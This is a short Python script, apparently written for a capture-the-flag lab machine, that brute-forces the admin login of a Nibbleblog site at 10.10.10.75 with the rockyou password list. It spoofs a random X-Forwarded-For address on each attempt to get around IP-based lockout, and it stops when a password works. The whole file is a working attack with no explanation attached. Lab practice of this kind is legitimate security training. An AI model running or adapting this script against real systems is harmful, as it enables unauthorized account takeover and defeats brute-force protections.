#! /usr/bin/env python3

import requests
from random import randint

user= 'admin'
url='http://10.10.10.75/nibbleblog/admin.php'
with open('/home/kali/Wordlists/rockyou.txt', 'r', encoding='ISO-8859-1') as wordlist_file:
	wordlist = wordlist_file.read().split()

for word in wordlist:
	fake_ip = f'127.{randint(0, 255)}.{randint(0, 255)}.{randint(0, 255)}'
	data = {'username': user, 'password': word}
	print(f'Trying {word} for {user} as {fake_ip}...', end='', flush=True)

	response = requests.post(url, data=data, headers={"X-Forwarded-For":fake_ip})
	if(response.ok):
		if('Incorrect username or password' in response.text):
			print('')
		else:
			print('\tSuccess!')
			break
